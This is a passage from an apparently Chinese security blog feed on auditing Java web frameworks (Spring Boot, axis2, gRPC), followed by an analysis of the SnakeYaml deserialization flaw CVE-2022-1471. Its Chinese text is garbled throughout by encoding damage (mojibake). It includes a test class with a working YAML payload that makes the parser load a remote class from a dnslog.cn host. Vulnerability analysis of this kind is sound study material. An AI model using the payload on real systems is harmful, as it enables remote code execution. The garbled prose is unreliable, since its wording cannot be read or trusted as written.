<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¿˜æ˜¯ç¨‹åºæ€§å¾—ç¡®å®šä¸€ä¸‹<code>spring boot</code>æ‰“åŒ…çš„<code>jar</code>åŒ…çš„ç»“æ„ï¼Œå…¶ä¸å…¶ä»–æ ‡å‡†<code>jar</code>åŒ…ç•¥æœ‰å·®å¼‚ï¼Œé™¤äº†æ ‡å‡†çš„<code>meta-inf</code>æ–‡ä»¶å¤¹å­˜æ”¾ä¸€äº›å…ƒä¿¡æ¯ä»¥å¤–ï¼Œ<br>è¿˜å¤šäº†ä¸€ä¸ª<code>boot-inf</code>çš„æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ª<code>boot-inf</code>æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹æ‰æ˜¯æˆ‘ä»¬çœŸæ­£çš„å¯åŠ¨ç±»ï¼Œåœ¨<code>meta-inf</code>æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸ª<code>MANIFEST.MF</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ°ä¸¤ä¸ªå±æ€§<code>Main-Class</code> ä¸ <code>Start-Class</code>ï¼Œ<br>å…¶ä¸­<code>Main-Class</code>æŒ‡å®šçš„å°±æ˜¯<code>spring boot</code>çš„å¯åŠ¨ç±»ï¼Œè€Œ<code>Start-Class</code>æŒ‡å®šçš„å°±æ˜¯æˆ‘ä»¬ç¼–å†™çš„å¯åŠ¨ç±»ã€‚</p>
<p>è¨€å½’æ­£ä¼ ï¼Œæˆ‘ä»¬é‡ç‚¹æ˜¯åœ¨åºæ‚çš„<code>jar</code>åŒ…ä¸­æ‰¾åˆ°çœŸæ­£å­˜æ”¾è¯·æ±‚å¤„ç†ç±»çš„<code>jar</code>åŒ…ï¼Œé‚£ä¹ˆå¦‚ä½•å¿«é€Ÿå®šä½å‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“<code>Spring Web</code>æ˜¯é€šè¿‡å‰ç«¯æ§åˆ¶å™¨<code>DispatcherServlet</code>æ¥è¿›è¡Œè¯·æ±‚çš„åˆ†å‘çš„ï¼Œ<br>åœ¨<code>DispatcherServlet</code>ä¸­æ–¹æ³•<code>doDispatch</code>è´Ÿè´£å…·ä½“çš„åˆ†å‘é€»è¾‘ï¼Œå…¶ä¸­<code>DispatcherServlet this</code>å¯¹è±¡çš„<code>handlerMappings</code> å±æ€§å­˜æ”¾çš„å°±æ˜¯æ‰€æœ‰çš„æ³¨å†Œçš„æ‰€æœ‰è¯·æ±‚çš„å¤„ç†å¯¹è±¡ï¼Œ<br>å½“ç”¨æˆ·è¯·æ±‚åˆ°æ¥æ—¶å°†ä»è¿™ä¸ª<code>map</code>ä¸­å–å¾—å¯¹åº”çš„<code>handlerMapping</code>è°ƒç”¨å¯¹åº”çš„æ–¹æ³•å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦éå†<code>handlerMappings</code>å°±å¯ä»¥æ‰¾åˆ°<code>controlle</code>æ‰€åœ¨çš„ä½ç½®äº†ã€‚å…·ä½“çš„æ“ä½œå¯èƒ½ä¸å¤ªæ–¹ä¾¿æè¿°ï¼Œ<br>æˆ‘ä»¬åªéœ€è¦é€çº§å±•å¼€è¯¥å¯¹è±¡è·å–å™¨å±æ€§ï¼Œç„¶åæ‰¾åˆ°å¸¦<code>controller</code>å­—æ ·çš„å±æ€§ç„¶åé¼ æ ‡å³é”®é€‰æ‹©<code>jump to type source</code>å°±å¯ä»¥è·³è½¬åˆ°ç±»å‹çš„å®šä¹‰ä¸ºæ­¢ã€‚å½“ç„¶æˆ‘è®²çš„è¿™äº›éƒ½æ˜¯åœ¨è°ƒè¯•ç¯å¢ƒä¸‹è¿›è¡Œçš„ã€‚<br><img src="/archives/b5364c9e/640.webp"></p>
<h1 id="axis2"><a href="#axis2" class="headerlink" title="axis2"></a>axis2</h1><p>å›½å†…å¯èƒ½è¿‡åˆ†è¿½æ±‚<code>spring</code>ç”Ÿæ€ç›¸å…³çš„ä¸œè¥¿ï¼Œè€Œå¯¹å…¶å®ƒçš„æŠ€æœ¯è¿ç”¨ä¸æ˜¯ç‰¹åˆ«å¹¿æ³›ã€‚æˆ‘è§‰å¾—<code>axis2</code>å°±ç®—æ˜¯ä¸€ä¸ªï¼Œåœ¨å›½å¤–çš„åº”ç”¨ä¸­ä½ ç»å¸¸å°±èƒ½çœ‹åˆ°ä»–ä»¬çš„èº«å½±ï¼Œè€Œåœ¨å›½å†…å´å¾ˆå°‘è§ï¼Œ<br>å›½å†…<code>java</code>ç¨‹åºå‘˜çš„ä¼ ç»Ÿè‰ºèƒ½å°±æ˜¯<code>spring framework    spring mvc spring boot   spring cloud spring security</code> ç­‰ã€‚</p>
<p><code>axis2</code>æ˜¯<code>apache</code>å¼€æºçš„ä¸€ä¸ªæµè¡Œçš„<code>webservice</code>å¼•æ“ï¼Œå…¶å¯ä»¥æ–¹ä¾¿åœ°å°†<code>java</code>ç±»å‘å¸ƒä¸º<code>service</code>ï¼Œç”¨æˆ·å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡<code>http</code>è¯·æ±‚è°ƒç”¨åˆ°<code>java</code>ç±»ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚</p>
<p><code>axis2</code>é€šè¿‡<code>soap</code>åè®®æ¥è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå‘å¸ƒä¸€ä¸ª<code>service</code>åªéœ€è¦ç¼–å†™ä¸€ä¸ª<code>java</code>ç±»ï¼Œç„¶åä½¿ç”¨å·¥å…·ç”Ÿæˆä¸€ä¸ª<code>wsdl</code>æ–‡ä»¶å³å¯ï¼Œä¸€èˆ¬åœ¨é»‘ç›’æƒ…å†µä¸‹è¦äº†è§£<code>service</code>å¯ä¾›ä½¿ç”¨çš„æ–¹æ³•ï¼Œ<br>åªéœ€è¦åœ¨éœ€è¦è®¿é—®çš„<code>service</code>è·¯å¾„ååŠ ä¸Šå‚æ•°<code>?wsdl</code>å³å¯ï¼Œå½“ç„¶è¿™éœ€è¦ä½ èƒ½å¤Ÿè¯»æ‡‚<code>wsdl</code>æ–‡ä»¶å¹¶ä¸”èƒ½å¤Ÿæ ¹æ®å…¶æ„é€ å‡ºæ¥å¯¹åº”çš„<code>soap</code>è¯·æ±‚ã€‚</p>
<p>åµŒå…¥å¼çš„<code>axis2</code>å®‰è£…ä¹Ÿæ˜¯é€šè¿‡åœ¨<code>web.xml</code>ä¸­æ³¨å†Œ<code>servlet</code>å®ç°çš„ï¼Œå¯»æ‰¾ç›¸å…³å…³é”®å­—å°±å¯ä»¥äº†ï¼Œä¸è¿‡ä¹Ÿæ²¡ä»€ä¹ˆå¿…è¦è¿™é‡Œæ³¨å†Œçš„å†…å®¹åªæ˜¯å‘Šè¯‰å®¹å™¨å»è§£æ<code>axis</code>è€Œå·²ï¼Œ<br>å…·ä½“ä¸æœåŠ¡ç›¸å…³çš„ä¸œè¥¿è¿˜æ˜¯è¦èƒ½å¤Ÿç²¾å‡†å®šä½åˆ°<code>porttype</code>ç±»ä¸å…·ä½“çš„<code>opration</code>æ‰è¡Œï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥ä»¥<code>web.xml</code>ä¸­æ³¨å†Œçš„<code>servlet</code>ä¸ºçªç ´å£ï¼Œæ‰¾åˆ°å¯¹åº”çš„ç±»æ‰“æ–­ç‚¹é€æ­¥è°ƒè¯•ä¹Ÿèƒ½æ‰¾åˆ°å¯¹åº”çš„<code>service</code>ç±»ï¼Œ<br>ä¸è¿‡è¿™éœ€è¦ä½ æœ‰è¶³å¤Ÿçš„ç»éªŒï¼Œèƒ½å¤Ÿæ ¹æ®æ–¹æ³•åçŒœåˆ°å…¶å¤§è‡´çš„åŠŸèƒ½ä»¥é¿å…ä¸å¿…è¦çš„å¼¯è·¯ã€‚</p>
<h1 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h1><p><code>rpc</code>ä¸<code>restful</code>ä¸€æ ·éƒ½æ˜¯ä¸€å¥—ä¸ä¿¡æ¯äº¤æ¢æœ‰å…³çš„è§„èŒƒï¼Œç”¨æˆ·å¾€å¾€æ¥è§¦åˆ°çš„æ˜¯<code>restful</code>é£æ ¼çš„<code>api</code>ï¼Œè€Œéšè—åœ¨<code>restful</code>åå°ä¸å¾®æœåŠ¡ï¼Œè¿‡ç¨‹è°ƒç”¨ç­‰ç›¸å…³çš„è§„èŒƒåˆ™å¾€å¾€æ˜¯<code>rpc</code>ã€‚<br><code>grpc</code>æ˜¯<code>google</code>çš„ä¸€å¥—<code>rpc</code>è§„èŒƒï¼Œå…¶é‡‡ç”¨<code>http/2</code>çš„æ–¹å¼è¿›è¡Œä¿¡æ¯äº¤æ¢ï¼Œä¼—æ‰€å‘¨çŸ¥ç›¸æ¯”äº<code>http/1.x http/2</code>é‡‡ç”¨å­—èŠ‚æµçš„æ–¹å¼å‘é€æ•°æ®ï¼Œèåˆäº†å¤šè·¯å¤ç”¨ã€å¤´éƒ¨å‹ç¼©ç­‰å¤šç§æ–°å…´æŠ€æœ¯å…·å¤‡æ›´å¿«çš„é€Ÿåº¦ä¸å¯é æ€§ã€‚</p>
<p>è¦å®ç°ä¸€ä¸ª<code>grpc</code>æœåŠ¡ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦æŒ‰ç…§<code>protobuf</code>çš„æ ¼å¼å®šä¹‰çš„<code>IDL</code>ï¼Œå³ä¸€ä¸ª<code>.proto</code>åç¼€çš„æ–‡ä»¶ï¼Œç„¶åæ ¹æ®è¯¥æ–‡ä»¶ä½¿ç”¨å·¥å…·ç¼–è¯‘ç”Ÿæˆä¸å®¢æˆ·ç«¯è¯·æ±‚å¤„ç†ç›¸å…³çš„<code>stub</code>ç±»ï¼Œ<br>ä»¥åŠä¸æœåŠ¡ç«¯æ–¹æ³•å®šä¹‰ç›¸å…³çš„<code>ImplBase</code>ç±»ã€‚æˆ‘ä»¬é€šè¿‡å®ç°<code>ImplBase</code>ç±»é€šè¿‡è¦†å†™å…¶æ–¹æ³•ç±»å®ç°æˆ‘ä»¬è‡ªå·±å¯¹å¤–æš´éœ²çš„æ–¹æ³•é€»è¾‘ï¼Œç„¶åå®¢æˆ·ç«¯é€šè¿‡è°ƒç”¨stubç±»åŒåæ–¹æ³•æ¥å®ç°è¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚</p>
<p>å½“<code>grpc</code>ä¸<code>spring boot</code>ç»“åˆçš„æ—¶å€™å¯¹æˆ‘ä»¬æŒ–æ´äººæ¥è¯´å¾€å¾€æ˜¯ä¸å‹å¥½çš„ï¼Œ<code>spring</code>é€šè¿‡æ³¨è§£è¿›è¡Œè‡ªåŠ¨è£…é…çš„æ€æƒ³å¯¹äºå¼€å‘äººå‘˜æ¥è¯´å¯èƒ½å¾ˆæ–¹ä¾¿ï¼Œä½†å¯¹å®¡è®¡äººå‘˜æ¥è¯´å¯çœŸæ˜¯éš¾å—ï¼Œç‰¹åˆ«æ˜¯åˆ†å¼€æ‰“åŒ…+å¾ˆå¤š<code>jar</code>çš„æƒ…å†µã€‚</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>Java</tag>
        <tag>jetty</tag>
        <tag>axis2</tag>
        <tag>struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>SnakeYamlååºåˆ—åŒ–è¿‡ç¨‹ä¸æ¼æ´åŸç†åˆ†æï¼ˆCVE-2022-1471ï¼‰</title>
    <url>/archives/f98d45ce.html</url>
    <content><![CDATA[<h1 id="SnakeYamlååºåˆ—åŒ–è¿‡ç¨‹ä¸æ¼æ´åŸç†åˆ†æï¼ˆCVE-2022-1471ï¼‰"><a href="#SnakeYamlååºåˆ—åŒ–è¿‡ç¨‹ä¸æ¼æ´åŸç†åˆ†æï¼ˆCVE-2022-1471ï¼‰" class="headerlink" title="SnakeYamlååºåˆ—åŒ–è¿‡ç¨‹ä¸æ¼æ´åŸç†åˆ†æï¼ˆCVE-2022-1471ï¼‰"></a>SnakeYamlååºåˆ—åŒ–è¿‡ç¨‹ä¸æ¼æ´åŸç†åˆ†æï¼ˆCVE-2022-1471ï¼‰</h1><blockquote>
<p>æ–‡å­—æè¿°éš¾å…æœ‰æ‰€è¡¥è¶³ï¼Œè¯·ç§»æ­¥è§†é¢‘è®²è§£ï¼š<a href="https://www.bilibili.com/video/BV1X14y1v71x/">SnakeYamlååºåˆ—åŒ–è¿‡ç¨‹ä¸æ¼æ´åŸç†åˆ†æï¼ˆCVE-2022-1471ï¼‰</a></p>
</blockquote>
<h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>SnakeYamlæ˜¯ä¸€ä¸ªå®Œæ•´çš„YAML1.1è§„èŒƒProcessorï¼Œæ”¯æŒUTF-8&#x2F;UTF-16ï¼Œæ”¯æŒJavaå¯¹è±¡çš„åºåˆ—åŒ–&#x2F;<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">ååºåˆ—åŒ–</a>ï¼Œæ”¯æŒæ‰€æœ‰YAMLå®šä¹‰çš„ç±»å‹ã€‚</p>
<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>è¯¥æ¼æ´æºäºç¨‹åºåœ¨è¿›è¡Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­æœªå¯¹ç”¨æˆ·è¾“å…¥å†…å®¹åšåˆæ³•æ€§éªŒè¯ï¼Œå¯¼è‡´äº†æ¶æ„ä»£ç æ‰§è¡Œã€‚</p>
<span id="more"></span>

<h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><p>&lt;&#x3D; SnakeYaml 1.33</p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="è°ƒè¯•ç¯å¢ƒ"><a href="#è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è°ƒè¯•ç¯å¢ƒ"></a>è°ƒè¯•ç¯å¢ƒ</h3><p>ä½¿ç”¨ideaæ–°å»ºåŸºäºmavençš„javaé¡¹ç›®ï¼Œåœ¨pom.xmlä¸­å¼•å…¥snakeyamlåŒ…</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¼–å†™æµ‹è¯•ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.constructor.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://i0hrz1.dnslog.cn\&quot;]]]]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨dnslogå¹³å°è·å–ä¸€ä¸ªåŸŸåå¡«åˆ°payloadä¸­ï¼Œç„¶åè¿è¡Œç¨‹åºè§‚å¯Ÿdnslogå¹³å°å¾—åŸŸåè§£ææƒ…å†µï¼Œè‹¥æœ‰è§£æè®°å½•ï¼Œåˆ™è¯æ˜å­˜åœ¨æ¼æ´ã€‚</p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>æœ¬æ–‡æˆ‘ä»¬ä¸ä»æ¼æ´æ‰‹ï¼Œè€Œæ˜¯é¦–å…ˆäº†è§£ä»¥ä¸‹snakeyamlæ—¶æ€æ ·è¿›è¡Œååºåˆ—åŒ–çš„ï¼Œè§‚å¯Ÿåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½æœ‰å“ªäº›é‡è¦çš„æ­¥éª¤ï¼Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­åˆæ˜¯ä¸ºä½•èƒ½å¤Ÿè§£æåˆ°æˆ‘ä»¬æä¾›çš„åŸŸåï¼Œè¿›è€Œèƒ½å¤Ÿè¿›è¡Œè¿œç¨‹ç±»åŠ è½½ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æ‰“åˆå§‹çš„æ–­ç‚¹ï¼š</p>
<p><img src="/archives/f98d45ce/image-20230814161735123.png" alt="image-20230814161735123"></p>
<p>è™½ç„¶æ¼æ´çš„è§¦å‘å…¥å£æ—¶åœ¨loadæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬é¦–å…ˆéœ€è¦å…³æ³¨çš„æ—¶yamlå¯¹è±¡çš„åˆå§‹åŒ–è¿‡ç¨‹ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814161845728.png" alt="image-20230814161845728"></p>
<p>ä»ä¸Šå›¾ï¼Œyamlé˜Ÿå½¢åˆå§‹åŒ–è¿‡ç¨‹ä¸­å…±è®¡æ¶‰åŠåˆ°5ä¸ªå¯¹è±¡çš„æ„å»º</p>
<table>
<thead>
<tr>
<th>å¯¹è±¡</th>
<th>åŠŸç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>Contructor</td>
<td>å¯¹è±¡æ„é€ å™¨ï¼Œè´Ÿè´£JavaBeanå¯¹è±¡çš„æ„é€ </td>
</tr>
<tr>
<td>Representer</td>
<td>è¡¨ç¤ºå™¨ï¼Œä¸çŸ¥é“æœ‰å•¥ç”¨ï¼Œå› ä¸ºæ²¡æœ‰å…·ä½“åˆ°å®ƒçš„æ–¹æ³•ï¼Œå®ƒåœ¨æœ¬æ¼æ´ä¸­æ‰®æ¼”çš„è§’è‰²ä¸æ˜¯ç‰¹åˆ«é‡è¦</td>
</tr>
<tr>
<td>DumperOptions</td>
<td>JavaBeanå¯¹è±¡åºåˆ—åŒ–é€‰é¡¹</td>
</tr>
<tr>
<td>LoaderOptions</td>
<td>yamlåºåˆ—åŒ–æ•°æ®ååºåˆ—åŒ–é…ç½®é€‰é¡¹ï¼Œåœ¨æ¼æ´ä¿®å¤ç‰ˆæœ¬ä¸­å°±æ˜¯åœ¨è¯¥ç±»ä¸­å¢åŠ äº†æ–°çš„ååºåˆ—åŒ–é€‰é¡¹æ¥é™åˆ¶è‡ªå®šä¹‰çš„å…¨å±€TAG</td>
</tr>
<tr>
<td>Resolver</td>
<td>åˆ†æå™¨ï¼Œå…·ä½“ä½œç”¨å®šä½ä¸å¤ªå¥½æè¿°ï¼Œå¦å¤–è¿˜æœ‰ä¸ªparserï¼Œå’Œresolverè§£é‡Šå¾ˆåƒï¼Œæ²¡å¤ªåŒºåˆ†æ˜ç™½ï¼Œå½“ç„¶ä»”ç»†ç ”ç©¶çš„è¯è‚¯å®šè¿˜æ˜¯å¯ä»¥åŒºåˆ†ã€‚</td>
</tr>
</tbody></table>
<p>loadæ–¹æ³•ä¼šè°ƒç”¨loadFromReaderä»streamReaderä¸­åŠ è½½å¯¹è±¡ï¼Œè€ŒstreamReaderå…¶å®åˆå°è£…äº†stringReaderå¯¹è±¡ï¼Œé¢å‘å¯¹è±¡è¿™å±‚å±‚å°è£…è¿˜æ˜¯æŒºæ¶å¿ƒçš„ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814162654884.png" alt="image-20230814162654884"></p>
<p>å¯ä»¥çœ‹åˆ°å°±æ˜¯å°è£…äº†ä¸€äº›å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬æ•°æ®çª—å£çš„å¤§å°ï¼Œæ•°æ®é•¿åº¦ï¼Œæ•°æ®æµï¼Œæµæ˜¯å¦ç»“æŸæ ‡å¿—ï¼Œç¼“å†²åŒºç­‰ï¼Œè€Œåœ¨StringReaderä¸­ä¹Ÿä»…å°è£…äº†å­—ç¬¦ä¸²é•¿åº¦ä¸å­—ç¬¦ä¸²å­—é¢é‡è€Œå·²ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814162937919.png" alt="image-20230814162937919"></p>
<p>loadFromReaderæ–¹æ³•ä¸»è¦å®Œæˆcomposerï¼ˆæ„å»ºå™¨ï¼‰çš„åˆ›å»ºä»¥åŠæ•°æ®çš„æ„å»ºã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814163122111.png" alt="image-20230814163122111"></p>
<p>æ„å»ºå™¨é‡Œä¸»è¦å°è£…äº†è§£æå™¨ã€åˆ†æå™¨ã€ååºåˆ—åŒ–é…ç½®ã€é”šç‚¹ã€é€’å½’èŠ‚ç‚¹ç­‰æ•°æ®ã€‚</p>
<p>è§£æå™¨é‡Œå°è£…äº†æ‰«æå™¨ï¼Œæ‰«æå™¨è´Ÿè´£å¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œé€ä¸ªå­—ç¬¦æ‰«æä»¥è·å–tokenã€å…ƒç´ å…¥å£ä¸å‡ºå£ã€è·å–é”®ä¸å€¼ã€å—å…¥å£ä¸å‡ºå£ç­‰ã€‚</p>
<p>åˆ†æå™¨ä¸»è¦è´Ÿè´£é€šè¿‡æ•°æ®å†…å®¹æ¥æ¨æµ‹å¯¹åº”çš„æ•°æ®ç±»å‹ï¼ŒYamlè¯­æ³•ä¸­ä¸»è¦åŒ…å«ä¸‰ç§æ•°æ®ç±»å‹å³åºåˆ—ã€æ˜ å°„ä¸æ ‡é‡ï¼Œæ‰€è°“åºåˆ—å°±æ˜¯åˆ—è¡¨ã€æ•°ç»„ç±»ä¼¼çš„æ¦‚å¿µï¼Œæ˜ å°„å¯ä»¥ç†è§£ä¸ºPythonä¸­çš„å­—å…¸ã€Javaä¸­çš„Mapï¼Œæ ‡é‡æ—¶Yamlä¸­çš„æœ€å°çš„ä¸å¯å†åˆ†çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ã€æ•´æ•°ã€æµ®ç‚¹æ•°ã€æ—¥æœŸæ—¶é—´ç­‰ç±»å‹ã€‚</p>
<p>é€šè¿‡contrutorçš„getSingleDataæ–¹æ³•å¯ä»¥è·å¾—åˆ°ä¸€ä¸ªtypeæŒ‡å®šç±»å‹çš„å¯¹è±¡ã€‚å…¶é¦–å…ˆéœ€è¦è°ƒç”¨composerçš„getSingleNodeæ–¹æ³•è·å–åˆ°ä¸€ä¸ªNodeå¯¹è±¡ï¼Œè¯¥Nodeå¯¹è±¡æ—¶å¯¹æˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–æ•°æ®çš„æ ¼å¼åŒ–è§£æä¸å°è£…ã€‚ç„¶åç”µæ³³constructDocumentæ–¹æ³•é€šè¿‡Nodeå¯¹è±¡è·å–æœ€ç»ˆçš„ç›®æ ‡å¯¹è±¡ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814164251442.png" alt="image-20230814164251442"></p>
<p>æˆ‘ä»¬é¦–å…ˆå…³æ³¨getSingleNodeæ–¹æ³•ã€‚è¿›å…¥è¯¥æ–¹æ³•ä¼šé¦–å…ˆé€šè¿‡è§£æå™¨å¯¹äº‹ä»¶è¿›è¡Œé…ç½®</p>
<p><img src="/archives/f98d45ce/image-20230814164458986.png" alt="image-20230814164458986"></p>
<p>å¯ä»¥çœ‹åˆ°è·å–äº‹ä»¶æ—¶å…¶å®æ—¶åŒæ•…å®«stateå¯¹è±¡è¿›è¡Œåˆ›å»ºçš„ï¼Œè€Œstateå¯¹è±¡å…¶å®æ˜¯ä¸€ä¸ªProductionæ¥å£çš„å®ä¾‹ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814164703271.png" alt="image-20230814164703271"></p>
<p>å…¶æœ‰å¾ˆå¤šçš„å®ç°ç±»ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒçš„èŠ‚ç‚¹ç±»å‹çš„ä¸åŒå¤„ç†é˜¶æ®µã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814164959202.png" alt="image-20230814164959202"></p>
<p>æˆ‘ä»¬åœ¨åˆå§‹åŒ–è§£æå™¨çš„æ—¶å€™ä¼šåˆå§‹åŒ–stateå¯¹ä¸‹ä¸ªä¸ºParseStreamStartçš„å®ä¾‹</p>
<p><img src="/archives/f98d45ce/image-20230814165131638.png" alt="image-20230814165131638"></p>
<p>æ•…æ­¤å¤„è°ƒç”¨çš„produceæ–¹æ³•å³æ˜¯<code>org.yaml.snakeyaml.parser.ParserImpl.ParseStreamStart#produce</code>ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­è·å–äº†è·å–äº†æµè§£æå¼€å§‹äº‹ä»¶å¹¶é‡ç½®äº†stateä¸ºä¸‹ä¸€é˜¶æ®µçš„éšå¼æ–‡æ¡£è§£æå¼€å§‹çŠ¶æ€ã€‚æ¯ä¸€ä¸ªäº‹ä»¶ä¸­éƒ½åŒ…å«ä¸¤ä¸ªé‡è¦çš„æ ‡å¿—Markï¼Œä¸€ä¸ªç§°ä¹‹ä¸ºstartMarkä¸€ä¸ªç§°ä¹‹ä¸ºendMarkï¼Œåˆ†åˆ«æ ‡è¯†äº†å½“å‰äº‹ä»¶å¤„ç†çš„å¼€å§‹ä¸ç»“æŸä½ç½®</p>
<p><img src="/archives/f98d45ce/image-20230814165258362.png" alt="image-20230814165258362"></p>
<p>åœ¨è·å–åˆ°äº‹ä»¶åï¼Œåˆ¤æ–­äº‹ä»¶æ˜¯å¦ä¸ºæµç»“æŸäº‹ä»¶ï¼Œè‹¥ä¸æ˜¯åˆ™è¿›å…¥åˆ°èŠ‚ç‚¹è§£æé€»è¾‘ã€‚åœ¨æ­¤é€»è¾‘å¼€å§‹æ—¶ä¼šè°ƒç”¨getEventæ–¹æ³•è·å–ä¸€ä¸ªå¼€å§‹äº‹ä»¶ï¼Œå¾…composeNodeæ–¹æ³•è°ƒç”¨å®Œæ¯•åï¼Œå†å—²ç”¨getEventæ–¹æ³•è·å–åˆ°ä¸€ä¸ªç»“æŸäº‹ä»¶ï¼Œæœ€åå¯¹é”šç‚¹ä¸è®°å½•çš„é€’å½’èŠ‚ç‚¹è¿›è¡Œæ¸…ç†ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814170038625.png" alt="image-20230814170038625"></p>
<p>åœ¨composeNodeæ–¹æ³•ä¸­ä¸»è¦æœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œå¦‚æœä½ çš„åºåˆ—åŒ–æ•°æ®è®¾ç½®äº†é”šç‚¹ä¸åˆ«åæ­¤æ—¶ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªåˆ†æ”¯ï¼Œè‹¥æ²¡æœ‰åˆ™ä¼šè¿›å…¥åˆ°elseåˆ†æ”¯ï¼Œæˆ‘ä»¬è¿™é‡Œä¼šè¿›å…¥åˆ°elseåˆ†æ”¯ã€‚</p>
<p><img src="/archives/f98d45ce/image-20230814170426979.png" alt="image-20230814170426979"></p>
<p>åœ¨elseåˆ†æ”¯ä¸­è¿˜æ˜¯é¦–å…ˆä¼šæŠŠäº‹ä»¶å¾€å‰æ¨ä¸€æ¬¡ï¼Œè·å¾—çš„NodeEventä¸»è¦åŒ…å«ä¸‰ç§ç±»å‹åˆ†åˆ«ä¸ºScalarNode SequenceNode MappingNodeï¼Œå³æˆ‘ä»¬å¼€å§‹è°ˆåˆ°çš„Yamlæ ¼å¼çš„ä¸‰ç§ç±»å‹æ ‡é‡ã€åºåˆ—ä»¥åŠæ˜ å°„ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬è¿™é‡Œä¼šè¿›å…¥åˆ°åºåˆ—çš„å¤„ç†é€»è¾‘é‡Œé¢ã€‚</p>
